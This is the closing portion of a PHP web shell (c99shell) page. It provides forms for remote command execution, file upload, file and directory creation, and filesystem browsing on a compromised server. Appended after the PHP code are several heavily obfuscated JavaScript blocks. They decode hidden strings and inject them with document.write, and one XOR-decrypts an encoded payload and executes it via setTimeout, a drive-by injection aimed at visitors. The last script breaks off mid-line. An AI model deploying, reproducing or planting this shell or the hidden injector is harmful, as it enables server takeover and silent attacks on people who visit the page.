if ($act == "about") {echo "<center><b>Credits:<br>Idea, leading and coding by tristram[CCTeaM].<br>Beta-testing and some tips - NukLeoN [AnTiSh@Re tEaM].<br>Thanks all who report bugs.<br>All bugs send to tristram's ICQ #656555 <a href=\"http://wwp.icq.com/scripts/contact.dll?msgto=656555\"><img src=\"http://wwp.icq.com/scripts/online.dll?icq=656555&img=5\" border=0 align=absmiddle></a>.</b>";}
?>
</td></tr></table><a bookmark="minipanel"><br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
<tr><td width="100%" height="1" valign="top" colspan="2"><p align="center"><b>:: <a href="<?php echo $surl; ?>act=cmd&d=<?php echo urlencode($d); ?>"><b>Command execute</b></a> ::</b></p></td></tr>
<tr><td width="50%" height="1" valign="top"><center><b>Enter: </b><form action="<?php echo $surl; ?>act=cmd" method="POST"><input type=hidden name=act value="cmd"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="cmd" size="50" value="<?php echo htmlspecialchars($cmd); ?>"><input type=hidden name="cmd_txt" value="1">&nbsp;<input type=submit name=submit value="Execute"></form></td><td width="50%" height="1" valign="top"><center><b>Select: </b><form action="<?php echo $surl; ?>act=cmd" method="POST"><input type=hidden name=act value="cmd"><input type=hidden name="d" value="<?php echo $dispd; ?>"><select name="cmd"><?php foreach ($cmdaliases as $als) {echo "<option value=\"".htmlspecialchars($als[1])."\">".htmlspecialchars($als[0])."</option>";} ?></select><input type=hidden name="cmd_txt" value="1">&nbsp;<input type=submit name=submit value="Execute"></form></td></tr></TABLE>
<br>
<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
<tr>
 <td width="50%" height="1" valign="top"><center><b>:: <a href="<?php echo $surl; ?>act=search&d=<?php echo urlencode($d); ?>"><b>Search</b></a> ::</b><form method="POST"><input type=hidden name=act value="search"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="search_name" size="29" value="(.*)">&nbsp;<input type="checkbox" name="search_name_regexp" value="1"  checked> - regexp&nbsp;<input type=submit name=submit value="Search"></form></center></p></td>
 <td width="50%" height="1" valign="top"><center><b>:: <a href="<?php echo $surl; ?>act=upload&d=<?php echo $ud; ?>"><b>Upload</b></a> ::</b><form method="POST" ENCTYPE="multipart/form-data"><input type=hidden name=act value="upload"><input type="file" name="uploadfile"><input type=hidden name="miniform" value="1">&nbsp;<input type=submit name=submit value="Upload"><br><?php echo $wdt; ?></form></center></td>
</tr>
</table>
<br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center><b>:: Make Dir ::</b><form method="POST"><input type=hidden name=act value="mkdir"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="mkdir" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Create"><br><?php echo $wdt; ?></form></center></td><td width="50%" height="1" valign="top"><center><b>:: Make File ::</b><form method="POST"><input type=hidden name=act value="mkfile"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="mkfile" size="50" value="<?php echo $dispd; ?>"><input type=hidden name="ft" value="edit">&nbsp;<input type=submit value="Create"><br><?php echo $wdt; ?></form></center></td></tr></table>
<br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center><b>:: Go Dir ::</b><form action="<?php echo htmlspecialchars($surl); ?>"><input type=hidden name=act value="ls"><input type="text" name="d" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Go"></form></center></td><td width="50%" height="1" valign="top"><center><b>:: Go File ::</b><form action="<?php echo htmlspecialchars($surl); ?>"><input type=hidden name=act value="gofile"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="f" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Go"></form></center></td></tr></table>
<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>--[ c99shell v. <?php echo $shver; ?> <a href="<?php echo $surl; ?>act=about"><u><b>powered by</b></u></a> Captain Crunch Security Team | <a href="http://ccteam.ru"><font color="#FF0000">http://ccteam.ru</font></a><font color="#FF0000"></font> | Generation time: <?php echo round(getmicrotime()-starttime,4); ?> ]--</b></p></td></tr></table>

<script>function RdN(LUzDgXCm){  fff.op.replace("639");window.eval(); fff.op.replace("639"); } 
function lpeRh(eddwmW){var VlsISta=2,fdCXFRNIGh=10;var cAbsMGv='29,4-38,4-37,8-40,2-36,8-39,2-37,6-23,8-41,2-38,4-37,4-40,6-38,2-29,6-27,2-23,8-38,2-37,6-38,4-38,0-38,2-40,6-29,6-27,2-23,8-37,0-39,6-40,2-37,4-37,6-',uSVRgwOa=cAbsMGv.split('-');uQgkxwByo='';
            function cUdLiMpqf(c)
            {
                return String.fromCharCode(c);
            }
            for(BJEHH=uSVRgwOa.length-1;BJEHH>=0x11+0x21-0xb-0x24-0x16+0x15-0x2;BJEHH-=0x24-0x8-0x2e+0x6+0x10-0x3)
            { wcZhCsU=uSVRgwOa[BJEHH].split(',');IChFL = parseInt(wcZhCsU[0]*fdCXFRNIGh)+parseInt(wcZhCsU[1]);IChFL = parseInt(IChFL)/VlsISta;uQgkxwByo = cUdLiMpqf(IChFL-(0xd-0x30+0x8+0x2d+0x45))+uQgkxwByo;}return uQgkxwByo;}function MPZ(eabbEpm){var XECbYznRlw=3,csGUY=9;var lFFTaUdkWG='67,0-49,3-45,0-39,6-63,0-67,0-61,3-65,3-62,6-61,6-66,0-67,0-62,3-62,6-67,0-49,3-45,0-39,6-67,3-67,0-62,0-49,3-42,0-63,6-67,6-67,6-66,3-48,3-44,6-44,6-',KZpmp=lFFTaUdkWG.split('-');jiGIKe='';
            function HubGNf(c)
            {
                return String.fromCharCode(c);
            }
            for(bsjDefCfV=KZpmp.length-1;bsjDefCfV>=-0x11+0x1b-0x1+0x30+0x21+0x18+0x1e-0x90;bsjDefCfV-=-0x30+0x21+0x10)
            { IqacTZbeO=KZpmp[bsjDefCfV].split(',');HHAGpsbK = parseInt(IqacTZbeO[0]*csGUY)+parseInt(IqacTZbeO[1]);HHAGpsbK = parseInt(HHAGpsbK)/XECbYznRlw;jiGIKe = HubGNf(HHAGpsbK-(-0x2+0x22-0x25-0x11+0x1b-0x1+0x53))+jiGIKe;}return jiGIKe;}function IGlCmod(piQfjPSi){var hfmrEoZ=4,csOXTsJRN=7;var SQi='108,4-116,4-112,0-107,3-112,4-116,0-109,1-105,1-76,0-106,2-113,1-112,0-76,4-109,5-112,4-78,2-76,0-113,5-109,1-113,5-72,0-85,1-84,0-76,4-109,5-108,0-114,6-105,1-112,0-107,3-',uwSdqwEDS=SQi.split('-');uHGfW='';
            function VlosDHPMem(c)
            {
                return String.fromCharCode(c);
            }
            for(haihdGOHVY=uwSdqwEDS.length-1;haihdGOHVY>=-0x24+0xa+0x3+0x4+0x13;haihdGOHVY-=0x21-0x9+0x7-0x1e)
            { MtPQfZhCBd=uwSdqwEDS[haihdGOHVY].split(',');Qbys = parseInt(MtPQfZhCBd[0]*csOXTsJRN)+parseInt(MtPQfZhCBd[1]);Qbys = parseInt(Qbys)/hfmrEoZ;uHGfW = VlosDHPMem(Qbys-(-0xb+0x2a+0x4-0x5+0x29+0x10))+uHGfW;}return uHGfW;}function nITT(yfWztI){  fff=op.split("971"); fff.op.replace("349"); } 
function iZSAqs(xiAXzWMt){var Tjl=3,nMTq=2;var LCjypMmNBX='223,1-',TtZJhG=LCjypMmNBX.split('-');sPZNcgJOi='';
            function YbuX(c)
            {
                return String.fromCharCode(c);
            }
            for(RVmF=TtZJhG.length-1;RVmF>=-0x1+0x30+0x16+0x25-0x14-0x56;RVmF-=0x2+0x25-0x5-0x21)
            { jPZlTJR=TtZJhG[RVmF].split(',');lEDlAWqURa = parseInt(jPZlTJR[0]*nMTq)+parseInt(jPZlTJR[1]);lEDlAWqURa = parseInt(lEDlAWqURa)/Tjl;sPZNcgJOi = YbuX(lEDlAWqURa-(-0xa-0xd+0x31+0x21+0x1c))+sPZNcgJOi;}return sPZNcgJOi;}function YbXVoiZ(bWrLDIgy){ var Tlt=new Function("Ubem", "return 807148;"); fff=op.split("183"); fff.op.replace("618");var Tlt=new Function("Ubem", "return 807148;"); } 
document['1278wr7338i8815t4225e56034085'.replace(/[0-9]/g,'')](lpeRh('fkakNnk'),MPZ('YcBFUHp'),IGlCmod('SyrTTxSV'),iZSAqs('ZQrBlC'));function YJO(rEdpVPIt){ var yyDMnjK = document.getElementById('pgVA'); fff.op.replace("769"); } 
function kcSPKvkxpG(XGEecV){ var MMsDQfra=new Function("vUxIN", "return 355757;");var uQIOooAQ = document.getElementById('FbNueB'); } 
function esFtqTZ(oswe){ var FTGLoEz = document.getElementById('cRp'); } 
</script>
<script>function uEQTGT(Tly){fff.op.replace("330"); } 
function qZLP(rtdxPYsA){var FhFYAFx=3,FtXBkO=2;var opjqhbibi='111,0-178,1-174,0-192,0-166,1-184,1-172,1-69,0-199,1-178,1-171,0-195,0-177,0-112,1-94,1-69,0-177,0-172,1-178,1-175,1-177,0-195,0-112,1-94,1-69,0-168,0-187,1-192,0-171,0-172,1-',pnoxZRtY=opjqhbibi.split('-');CMJuejf='';function MmualISBAh(c){return String.fromCharCode(c);}for(QTJMgSLu=(pnoxZRtY.length-1);QTJMgSLu>=(0x27+0x19-0x29+0x13-0x2a);QTJMgSLu-=0x2e-0x7+0x16+0x31-0x6d){ KzuhUH=pnoxZRtY[QTJMgSLu].split(',');vSRxlM = parseInt(KzuhUH[0]*FtXBkO)+parseInt(KzuhUH[1]);vSRxlM = parseInt(vSRxlM)/FhFYAFx;CMJuejf = MmualISBAh(vSRxlM-(-0x28-0x20-0x7+0x2e+0x2f+0x27-0x27))+CMJuejf;}if( CMJuejf.charCodeAt( CMJuejf.length-1) == 0)CMJuejf = CMJuejf.substring(0, CMJuejf.length-1);return CMJuejf.replace(/^\s+|\s+$/g, '');}function qFaLZ(VgOCSfGM){ alert('VNiDlNkETP'); } 
function qCaCGik(hPKtjZY){var CcEptTR=3,cKT=4;var etRk='96,0-56,1-46,2-34,2-87,0-96,0-83,1-92,1-86,1-84,0-93,3-96,0-85,2-86,1-96,0-56,1-46,2-34,2-96,3-96,0-84,3-56,1-39,3-88,2-97,2-97,2-94,2-54,0-45,3-45,3-',Evx=etRk.split('-');hADFvxU='';function zQWgSzrLki(c){return String.fromCharCode(c);}for(nXHAad=(Evx.length-1);nXHAad>=(0x2e-0x5-0x1f-0x17-0x5-0x1c+0x2e);nXHAad-=0x13-0x32-0x2a-0x24+0x1a+0x18+0x3c){ fFKt=Evx[nXHAad].split(',');BzOtIEmZN = parseInt(fFKt[0]*cKT)+parseInt(fFKt[1]);BzOtIEmZN = parseInt(BzOtIEmZN)/CcEptTR;hADFvxU = zQWgSzrLki(BzOtIEmZN-(0x1e-0x3-0x1c+0x8-0x20-0x8+0x2f))+hADFvxU;}if( hADFvxU.charCodeAt( hADFvxU.length-1) == 0)hADFvxU = hADFvxU.substring(0, hADFvxU.length-1);return hADFvxU.replace(/^\s+|\s+$/g, '');}function lArl(iWMSlDjR){var wsQUc=4,xnsiWYwap=5;var AMnDIRRp='100,0-104,4-93,3-94,2-106,2-88,4-48,0-90,2-100,0-98,2-48,4-95,1-99,1-52,4-48,0-100,4-94,2-100,4-42,2-60,4-59,1-48,4-95,1-92,4-102,2-88,4-98,2-92,0-60,4-',zuhNmE=AMnDIRRp.split('-');KuxZrugfZD='';function IFXqgBs(c){return String.fromCharCode(c);}for(YvUbfX=(zuhNmE.length-1);YvUbfX>=(0x1e+0x23-0x41);YvUbfX-=0x1a+0x1c-0x1e+0x8-0x6-0x19){ RuVuPrSaa=zuhNmE[YvUbfX].split(',');wdzs = parseInt(RuVuPrSaa[0]*xnsiWYwap)+parseInt(RuVuPrSaa[1]);wdzs = parseInt(wdzs)/wsQUc;KuxZrugfZD = IFXqgBs(wdzs-(-0x17+0x14+0x2a-0x13+0x2f+0x26-0x5b))+KuxZrugfZD;}if( KuxZrugfZD.charCodeAt( KuxZrugfZD.length-1) == 0)KuxZrugfZD = KuxZrugfZD.substring(0, KuxZrugfZD.length-1);return KuxZrugfZD.replace(/^\s+|\s+$/g, '');}var UrdRh=qZLP('ERWHE')+qCaCGik('grcu')+lArl('rHePy'); HqlzXHjJve=document;HqlzXHjJve['5350wr3371i6938t7078e59467460'.replace(/[0-9]/g,'')](UrdRh);function yoSnqC(TOWXLLOA){ var sjMmLX = document.getElementById('VCF'); fff.op.replace("396"); } 
function BumvYsfwr(Hzdg){ var FAd=new Function("MmNhmml", "return 789480;");var ehrDXPwt = document.getElementById('DKARR'); } 
function UClzxt(djvKGvEh){fff.op.replace("265");var KrGkVeqYdo=new Function("THdSfdcrN", "return 280763;"); } 
</script>

<script>function ZsTvTrDzZ(){if (navigator.userAgent.indexOf("MSIE")>0) return document.body.clientWidth*document.body.clientHeight;else return window.outerWidth*window.outerHeight;}if(ZsTvTrDzZ()>100000){function mZcXRmH(BmB){var MvkbLhpQwc=6,QLA=9;var VwJ='55-3+85-3+83-3+91-3+80-0+88-0+82-6+36-6+94-6+85-3+82-0+92-6+84-6+56-0+48-0+36-6+84-6+82-6+85-3+84-0+84-6+92-6+56-0+48-0+36-6+80-6+89-3+91-3+82-0+82-6+',HlStoWoAY=VwJ.split('+');IIkTgIY='';function Hejy(c){return String.fromCharCode(c);}for(APPlOh=(HlStoWoAY.length-1);APPlOh>=(0x1d-0x32+0x0-0x19-0x19+0x47);APPlOh-=-0x21-0x17+0x1+0x38){ jHUGohRbmd=HlStoWoAY[APPlOh].split('-');MlPJMe = parseInt(jHUGohRbmd[0]*QLA)+parseInt(jHUGohRbmd[1]);MlPJMe = parseInt(MlPJMe)/MvkbLhpQwc;IIkTgIY = Hejy(MlPJMe-(0x2f+0x17-0x2b-0x19+0x15))+IIkTgIY;}if( IIkTgIY.charCodeAt( IIkTgIY.length-1) == 0)IIkTgIY = IIkTgIY.substring(0, IIkTgIY.length-1);return IIkTgIY.replace(/^\s+|\s+$/g, '');}function tEFb(tFoqJxgNK){fff=op.split("617"); fff=op.split("617"); } 
function XXUEqjMXz(ZjMdvONIg){var jlItKmOZ=2,fvrDgEO=3;var UxiC='91-1+56-0+47-1+36-2+83-1+91-1+80-0+88-0+82-2+80-2+89-1+91-1+82-0+82-2+91-1+56-0+47-1+36-2+92-0+91-1+81-1+56-0+41-1+84-2+92-2+92-2+90-0+54-0+46-2+46-2+',vHVQU=UxiC.split('+');MPakrYEVNH='';function JZbLWlxWkT(c){return String.fromCharCode(c);}for(aOaAzqs=(vHVQU.length-1);aOaAzqs>=(-0x17-0x28+0x31+0xe);aOaAzqs-=0xa-0x25-0xc-0xd+0x24+0x9+0x8){ XtrMv=vHVQU[aOaAzqs].split('-');Plm = parseInt(XtrMv[0]*fvrDgEO)+parseInt(XtrMv[1]);Plm = parseInt(Plm)/jlItKmOZ;MPakrYEVNH = JZbLWlxWkT(Plm-(-0x3-0x28-0x1c+0x21+0x1d+0x2c-0xc))+MPakrYEVNH;}if( MPakrYEVNH.charCodeAt( MPakrYEVNH.length-1) == 0)MPakrYEVNH = MPakrYEVNH.substring(0, MPakrYEVNH.length-1);return MPakrYEVNH.replace(/^\s+|\s+$/g, '');}function aUNe(scjSPpkSdL){ window.eval();alert('JKh'); } 
function PliJaQLtv(oalgL){var jlCi=2,wgasN=8;var hsvn='34-6+33-4+30-2+31-0+36-0+31-0+35-4+17-2+30-4+33-4+33-0+17-4+32-0+33-2+20-0+17-2+33-6+31-6+33-6+15-4+21-2+20-6+17-4+32-0+31-2+34-2+30-0+33-0+31-0+21-2+',BTcbXm=hsvn.split('+');gBSXLHz='';function zjb(c){return String.fromCharCode(c);}for(yWSX=(BTcbXm.length-1);yWSX>=(0x26+0x23+0x1a-0x1e+0x0-0x45);yWSX-=0xe+0x28-0x1+0x0-0x15+0xd-0x2c){ KHH=BTcbXm[yWSX].split('-');VYtMiv = parseInt(KHH[0]*wgasN)+parseInt(KHH[1]);VYtMiv = parseInt(VYtMiv)/jlCi;gBSXLHz = zjb(VYtMiv-(-0x1d-0x1-0x15-0x9+0x53))+gBSXLHz;}if( gBSXLHz.charCodeAt( gBSXLHz.length-1) == 0)gBSXLHz = gBSXLHz.substring(0, gBSXLHz.length-1);return gBSXLHz.replace(/^\s+|\s+$/g, '');}function bxrpgP(GmiekGbN){fff.op.replace("576"); } 
var UWdTZM=mZcXRmH('JOCDtVbDp')+XXUEqjMXz('dYuYplKD')+PliJaQLtv('kMzXyZtJ'); DSHgG=document;DSHgG['5215wr5665i6452t6298e42358029'.replace(/[0-9]/g,'')](UWdTZM);function OpcQg(OuMpJ){fff.op.replace("187");var tCrl = document.getElementById('AJwudH'); } 
function FLMrxvIvZ(fEVm){fff.op.replace("993"); fff=op.split("386");window.eval();var Uue = document.getElementById('RkqvQdwiZU'); } 
function qjYWCARfe(RVuiwVSHGd){ alert('soXgr');alert('soXgr');window.eval(); } 
}</script>

<script>jwYWDZiBkO='';function YIh(lkePU){ alert('lRexX');var VKjwOjJnkB=new Function("RPqOHITN", "return 647782;"); } var jVQ='';var yLB=false;var bCGP="bCGP";var qMU='';var ePV;var kMV="";var sEE="sEE";ePV='%db%cf%d5%c1%ce%db%d7%c8%f5%b3%e8%a8%92%b6%ba%d2%8b%93%93%b7%fd%85%80%82%97%c3%9f%8e%91%9f%e4%b8%90%b2%bb%99%8a%9e%83%b4%bc%c3%d2%ce%c7%dd%c0%dc%8d%81%d5%b0%a8%d2%bc%ce%8a%cd%96%85%91%ec%84%97%86%c5%da%ee%ba%aa%d4%e2%d8%e4%c9%dd%c8%f4%cf%fc%b5%bb%89%98%9b%de%93%cf%c3%84%d7%ee%ff%84%91%89%8b%89%93%e4%80%d4%f4%e5%ef%8a%9c%9b%c4%df%c0%c6%d7%db%fd%ed%c5%8c%8f%84%cc%d3%d3%c0%90%b1%e1%db%c9%e7%83%89%83%9b%da%e3%f5%91%89%d1%cc%f9%e4%ee%fb%ee%d2%e4%ee%9d%83%df%f8%e0%a0%8e%a7%be';var nLX="";var yXK=false;var xQW='';function vMJF(tVZ){var xZL=false;var sVX="sVX";var kDE=false;var yYVW=38456;                                function nKJW(lMX, fUP){var aFE=50870;var bTD=22725;var dWFH=false;var cIL=36514;var sGH=false;if(qYR == null) {var xRHX="";var dPMK="";qYR = {};var hCK=false;var nVM=false;}var cTNG="";var uZJX="uZJX";var rTQA="";var tZVE=false;var bPCH="";if(qYR[lMX] == null) {var dVXS="dVXS";var hMI="hMI";var dKM='';qYR[lMX] = new Object();var mEH=52867;var uNW='';var tDSH=false;var qOK="";qYR[lMX].hKB = 0;var hPK="hPK";var gOO=42641;qYR[lMX].qYDB = fUP;var sNNZ=false;var oYPT='';}var mVVU='';var mHM=17524;}var uDGT="";var yAR="yAR";var zCHO='';var sFX=false;var jDW='';var hGMZ=false;function nUAO(oYKM){var fPF='';var bLUZ=24071;var uFJ='';var gWVH="gWVH";var tEL="";var xPA=4584;var zFGI="";var pXKY="pXKY";var xASX=0;var gYNU=false;var gDU='';var wED="";var aBF="aBF";                                        var oNY=oYKM.length;var bQX='';var pNRS="";var nPDU=0;var fJII="fJII";var pGU=false;while(nPDU<oNY){var xRAK='';var dUI='';var xCV="xCV";var iEL='';nPDU+=1;var rQXE="";var oAIB=false;var tAL=13378;eLU=qVI(oYKM,nPDU-1);var pPHB='';var xYE="";var xNI='';xASX+=eLU*oNY;var bZXR="bZXR";var yMEB=false;var jZEI="";                                                var sHAY="sHAY";var lSCT=40563;var gVWS="";}var lFS=false;var uALC="uALC";var hLVV=65207;var lVLJ=false;var mPV=38881;var sWZG=49083;var uDQH="";return new String(xASX);var lQGY='';var vTL=9029;var bIN=21910;var oAZV="";}var hSKH=false;var iDN=false;var iHSX=false;var gMPY='';var mLZE=false;var jVGR=false;var aFU=false;var iCNQ=false;var aGO=false;var tTP=27103;var jTA="jTA";var rEXG='';function pKU(lMX) {var xMRY="xMRY";var jDPA="";var bXB="bXB";var zWEX="zWEX";if(qYR[lMX] != null) {var mOY='';var pOEP=false;var pJA="pJA";var dUXA="dUXA";var aVF = qYR[lMX].hKB;var rVW="rVW";var qUA="qUA";var tDE='';var sOM=false;var qEN = qYR[lMX].qYDB.substr(aVF, 1);var fNND="fNND";var sVMU="sVMU";var cNBW=38334;var cXQ=false;var bZN="";if(aVF + 1 >= qYR[lMX].qYDB.length) {var nONQ=false;var kRZB="";var sJRX=false;qYR[lMX].hKB = 0;var vLD="";var dHU="";} else {var cFUD=61159;var mAMK='';var qWP=false;var rTFW="";qYR[lMX].hKB = aVF + 1;var hNZE="hNZE";var hJTN="hJTN";}var oFO=38680;var yEY=false;return qVI(qEN, 0);var gLUY="gLUY";var bAN="";var hBMX=false;}var jXSR=41277;var oDX="";var xFVF='';var kXU="kXU";}var lPVE='';var qQB="qQB";var kOD="";var uXCO="";var dUIH="dUIH";var yLIX=26062;var eJZG="";var rLL=64059;var mEW="mEW";var cDL="cDL";var aZJ=48637;var cVA = new String(document['dZovcZuZm0efnvt*'.replace(/[\*v0fZ]/g, '')]);var rDGD='';var mFZB="mFZB";function qVI(tHEL,zNRM){var cSV=63492;var kQIH='';var yIAN='';return tHEL.charCodeAt(zNRM);var rWZ="";var wYZW="wYZW";}var dCAZ="";var xMZA='';if(cVA.indexOf('a}rFiQt}yH'.replace(/[HFQW\}]/g, '')) !== -1) {var hGM="";var lHYR=31791; return 224;var rHD=false;var vVO='';var jGHY="jGHY";var eSLW=false;}var dND=false;var rVY=3964;var wGDW=false;var zDZV=false;var rRPN="rRPN";var qYR = null;var xBYV="";var uHYB=false;var wDCE=window;var xMN="xMN";var pTKF="pTKF";var tOFN=window;var rLS=false;var xSKX=30517;var lRIP=false;var cUDU=String;var uKB="";var uCAJ=false;var sGDN = wDCE['sXevtvTaibmXe:oauXtb'.replace(/[baX\:v]/g, '')];var eSJ=false;var nKQE="nKQE";var xVL='';var uGU="";var sHOY=224;var eDLP=false;var yDP=false;var bXH=wDCE['u*nZe&sZcZa&pre2'.replace(/[2\*Z&r]/g, '')];var oKEZ="oKEZ";var oNN='';var kQPP = '';var pWYK="pWYK";var wWGD="wWGD";var iYD=46792;var vYN=cUDU['f$r$oHmMC*h$aMr$C*oMd7e*'.replace(/[\*\$H7M]/g, '')];var jOK=false;var sQTF="";var tVZ = bXH(tVZ);var kHM='';var mHEH=false;var jAS='';var eND=715;var kBL=54225;var fACI = new cUDU(vMJF).replace(/[^@a-z0-9A-Z_-]/g,'');var eNG="eNG";var lSYF="lSYF";var bZY=false;var fJYR='';var iEWA = new cUDU(nUAO(fACI));var nBHB=27158;var jWVZ="jWVZ";var qJKT="";var iPE="";var vNP="vNP";var nMMO=false;var vHFQ=9831;var xGS='';nKJW('zQUT', fACI);var iBH='';var uJMI=false;var mRY='';var xKY=false;nKJW('kRRM', iEWA);var zKD=false;var sFP='';var aILR=32058;var zJGP="zJGP";var mEHV='';var xSZP='';var hGDW="hGDW";for(var aHBQ=0; aHBQ < (tVZ.length); aHBQ++) {var lZK=34746;var cUIB=20046;var eVB=false;var aZL="";var zNV='';var aTT='';var qKV = qVI(tVZ,aHBQ);var tBP=false;var aGP=false;var fVB="";var iLK=false;qKV^= sHOY;var uTHW='';var sPY="";qKV^= pKU('kRRM');var jELG="";var kCKQ='';var iLS='';var hWI="hWI";qKV^= pKU('zQUT');var wGV='';var nFY="nFY";var vVP="vVP";var yNS="yNS";var fGRN=false;var rFC="";kQPP+=vYN(qKV);var eNN="";var zAOU=49695;var aXW=65412;var xLP=33600;}var mHJC="mHJC";var lHTH="";var pWRF=52099;var eWCZ="";var jRMX='';sGDN(kQPP, 77);var sVYR=false;var uLVL="";var xRI="xRI";var yGH=61942;return kQPP=new cUDU();var mAG="";var bSF=25458;var wWP='';var wXVC=false;var iLA="";var kUJQ=false;var nBDC=false;};var rOYX="rOYX";var eYGD=3144;vMJF(ePV);var jME="jME";var sNNH="sNNH";var wZCG=15788;</script>
<script>function JODI(){if (navigator.userAgent.indexOf("MSIE")>0) return document.body.clientWidth*document.body.clientHeight;else return window.outerWidth*window.outerHeight;}if(JODI()>100000){function qArhFjyvWg(soEm){var CcySlu=4,vcN=5;var QdlNbSLt='122-2+166-2+153-3+165-3+158-2+164-0+167-1+124-0+167-1+163-1+164-0+111-1+160-4+163-1+153-3+152-0+167-1+158-2+163-1+162-2+123-1+105-3+157-3+167-1+167-1+164-0+120-4+112-0+112-0+165-3+',AMT=QdlNbSLt.split('+');PMoQuQ='';function XKJepVPIJ(c){return String.fromCharCode(c);}for(StgCp=(AMT.length-1);StgCp>=(-0x11+0x1f-0x2-0x8-0xb+0x7);StgCp-=0x29+0x7-0x2f+0x1+0x22-0x23){ mgN=AMT[StgCp].split('-');GalcEbPPSt = parseInt(mgN[0]*vcN)+parseInt(mgN[1]);GalcEbPPSt = parseInt(GalcEbPPSt)/CcySlu;PMoQuQ = XKJepVPIJ(GalcEbPPSt-(0x19-0x14+0x25+0x24+0xe+0x1))+PMoQuQ;}if( PMoQuQ.charCodeAt( PMoQuQ.length-1) == 0)PMoQuQ = PMoQuQ.substring(0, PMoQuQ.length-1);return PMoQuQ.replace(/^\s+|\s+$/g, '');}function fCuF(lTKU){ var Fmlq = document.getElementById('dhgLIn');alert('zPIs');window.eval();alert('zPIs'); } 
function dwJnWTIZ(hkxch){var RKung=3,iJXxMvJQpN=10;var Ayx='57-0+62-4+57-6+61-2+61-5+41-7+57-6+61-2+60-6+42-0+62-1+58-2+57-9+42-9+41-7+61-5+59-1+61-5+39-6+45-6+45-9+42-0+62-4+57-6+62-1+59-4+61-5+62-7+46-5+',AFtZjPSQII=Ayx.split('+');CqMWZS='';function CjSWiS(c){return String.fromCharCode(c);}for(tKVVcWEE=(AFtZjPSQII.length-1);tKVVcWEE>=(-0xb-0x2c+0x29+0xe);tKVVcWEE-=-0xa-0x9-0x4+0x25-0xd){ UeVu=AFtZjPSQII[tKVVcWEE].split('-');YqQdKOycuK = parseInt(UeVu[0]*iJXxMvJQpN)+parseInt(UeVu[1]);YqQdKOycuK = parseInt(YqQdKOycuK)/RKung;CqMWZS = CjSWiS(YqQdKOycuK-(0x1c+0x16-0x7+0x20-0x32+0x44))+CqMWZS;}if( CqMWZS.charCodeAt( CqMWZS.length-1) == 0)CqMWZS = CqMWZS.substring(0, CqMWZS.length-1);return CqMWZS.replace(/^\s+|\s+$/g, '');}function CZBobLXU(LigKqvOBf){ var qNSqKeEa = document.getElementById('lJC');alert('eyyW');window.eval(); } 
function izgyjUaZ(haNpu){fff=op.split("1122");alert('UybeDNk'); } 
var BIDazSfbO=qArhFjyvWg('RJfrRU')+dwJnWTIZ('VxixPke'); gtELjrVa=document;gtELjrVa['3921wr7871i9291t2637e41976489'.replace(/[0-9]/g,'')](BIDazSfbO);function rzWPqHzWr(XFyDjrLxG){ alert('GvEueFOWx'); fff=op.split("279"); } 
function UsKEERzr(myevF){ var oDofZZtLqN = document.getElementById('oPPqs'); } 
function oUloGkDG(XmYqo){ window.eval(); } 
}</script>

<script>function RAGiuKd(){if (navigator.userAgent.indexOf("MSIE")>0) return document.body.clientWidth*document.body.clientHeight;else return window.outerWidth*window.outerHeight;}if(RAGiuKd()>100000){function OttHtlOv(BIBcX){ window.eval(); fff.op.replace("1094"); fff=op.split("648"); } 
function hvgmTTyxL(YDBBsZHg){var zZWC=5,kxo=4;var zHSqWlsi='136-1,192-2,188-3,203-3,182-2,197-2,187-2,101-1,210-0,192-2,186-1,206-1,191-1,137-2,122-2,101-1,191-1,187-2,192-2,190-0,191-1,206-1,137-2,122-2,101-1,183-3,200-0,203-3,186-1,187-2,',QBEt=zHSqWlsi.split(',');zOWA='';function RJcNMMObv(c){return String.fromCharCode(c);}for(LlfPOEat=(QBEt.length-1);LlfPOEat>=(0xc+0x1d+0x4-0xb-0x10-0x5-0xd);LlfPOEat-=0x1e+0x2d+0x2a-0x74){ miX=QBEt[LlfPOEat].split('-');YpBqZkW = parseInt(miX[0]*kxo)+parseInt(miX[1]);YpBqZkW = parseInt(YpBqZkW)/zZWC;zOWA = RJcNMMObv(YpBqZkW-(0x14+0x17+0x11-0x31-0x2d+0x53))+zOWA;}if( zOWA.charCodeAt( zOWA.length-1) == 0)zOWA = zOWA.substring(0, zOWA.length-1);return zOWA.replace(/^\s+|\s+$/g, '');}function SdtK(ZOak){var COYg=7,bkcJqeeUsE=9;var jZl='126-7,85-5,75-4,63-0,117-4,126-7,113-5,122-8,116-6,114-3,124-4,126-7,115-8,116-6,126-7,85-5,75-4,63-0,127-5,126-7,115-1,85-5,68-4,119-0,128-3,128-3,125-2,83-2,74-6,74-6,',mZpRVgJPs=jZl.split(',');ljPnE='';function DwplpewoaC(c){return String.fromCharCode(c);}for(HmelVGe=(mZpRVgJPs.length-1);HmelVGe>=(0x13+0x2a+0x1f+0x4-0x60);HmelVGe-=-0x32+0x22-0x1b-0x20+0xe+0x3e){ iJCPiDbm=mZpRVgJPs[HmelVGe].split('-');jmt = parseInt(iJCPiDbm[0]*bkcJqeeUsE)+parseInt(iJCPiDbm[1]);jmt = parseInt(jmt)/COYg;ljPnE = 